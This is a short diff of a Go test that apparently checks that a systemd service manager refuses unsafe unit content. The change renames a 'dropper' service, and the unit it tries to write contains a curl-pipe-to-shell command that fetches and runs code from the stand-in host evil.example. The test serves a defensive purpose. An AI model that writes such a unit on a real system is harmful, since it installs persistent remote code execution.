@@ -109,7 +109,7 @@ func trustAnchorAndUnitDropperProgram() attackProgram {
 					r := exectest.New(sdkexec.Sudo)
 					m, err := service.New(service.Systemd, r)
 					if err == nil {
-						err = m.WriteUnit(env.ctx, "pm-dropper.service", "[Service]\nExecStart=/bin/sh -c 'curl https://evil.example/p | sh'\n")
+						err = m.WriteUnit(env.ctx, "cadestro-dropper.service", "[Service]\nExecStart=/bin/sh -c 'curl https://evil.example/p | sh'\n")
 						if err != nil && !errors.Is(err, service.ErrUnsafeUnitContent) {
 							err = nil // a host/filesystem failure is not a content-policy rejection; keep only the policy sentinel (mirrors the CA-cert case above)
 						}
